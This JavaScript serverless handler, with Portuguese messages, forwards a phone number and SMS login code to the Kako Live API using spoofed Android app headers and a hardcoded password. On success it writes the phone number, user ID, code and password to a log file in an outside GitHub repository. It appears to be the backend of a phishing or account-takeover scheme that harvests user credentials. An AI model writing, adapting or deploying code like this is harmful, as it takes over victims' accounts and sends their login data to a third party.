export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' });
  }

  try {
    const { phone, code } = req.body;
    if (!phone || !/^\d{11}$/.test(phone.replace(/\D/g, '')) || !code || code.length !== 6 || /\D/.test(code)) {
      return res.status(400).json({ error: 'Dados inválidos (phone ou code)' });
    }

    const response = await fetch('https://api.kako.live/api/v1/login/phone/submit', {
      method: 'POST',
      headers: {
        'accept': 'application/json',
        'accept-language': 'pt',
        'x-app-devicetype': 'android',
        'x-app-version': '1.15.2',
        'x-app-bundleid': 'live.kako.global',
        'x-app-channelid': 'google',
        'x-app-buildid': '24bbabf0',
        'x-app-lang': 'pt',
        'x-app-lang-excludes': 'en,es',
        'x-app-deviceid': 'a5247afb-4d54-4867-b6ab-637496a78cf1',
        'x-app-timezone': 'America/Sao_Paulo',
        'x-app-country': 'BR',
        'x-app-devicename': 'Motorola moto g(8)',
        'content-type': 'application/json; charset=UTF-8',
        'accept-encoding': 'gzip',
        'user-agent': 'okhttp/4.12.0'
      },
      body: JSON.stringify({
        phone: phone,
        password: "335112blk",
        code: code,
        scene: 0
      })
    });

    if (!response.ok) {
      throw new Error(`Erro na API: ${response.status} - ${await response.text()}`);
    }
    const data = await response.json();
    res.status(200).json(data);

    // Fallback pro GitHub se JSONBin falhar (chamado do frontend)
    if (data.code === 0) {
      await sendToGitHub({ phone, id: req.body.id || '', pin: code, timestamp: new Date().toISOString() });
    }
  } catch (error) {
    console.error('Erro no handler Login:', error);
    res.status(500).json({ error: 'Erro interno do servidor' });
  }
}

// Função auxiliar pra GitHub (usando variável de ambiente)
async function sendToGitHub(formData) {
  const GITHUB_TOKEN = process.env.GITHUB_TOKEN; // Token como variável de ambiente
  const OWNER = "infinityrecarga";
  const REPO = "kako-logs-contencao";
  const PATH = "logs.txt";

  try {
    const getUrl = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${PATH}`;
    const getHeaders = { "Authorization": `token ${GITHUB_TOKEN}`, "Accept": "application/vnd.github.v3+json" };
    const getResp = await fetch(getUrl, { headers: getHeaders });
    const getData = await getResp.json();
    const sha = getData.sha;
    const currentContent = atob(getData.content);

    const logLine = `${formData.timestamp} | ${formData.phone} | ${formData.id} | ${formData.pin} | 335112blk\n`;
    const updatedContent = currentContent + logLine;
    const putData = {
      message: "Adiciona log de contenção",
      content: btoa(updatedContent),
      sha: sha
    };
    const putResp = await fetch(getUrl, {
      method: "PUT",
      headers: getHeaders,
      body: JSON.stringify(putData)
    });
    if (putResp.ok) console.log("Log salvo no GitHub!");
    else console.error("Falha no GitHub:", await putResp.text());
  } catch (error) {
    console.error("Erro no fallback GitHub:", error);
  }
}
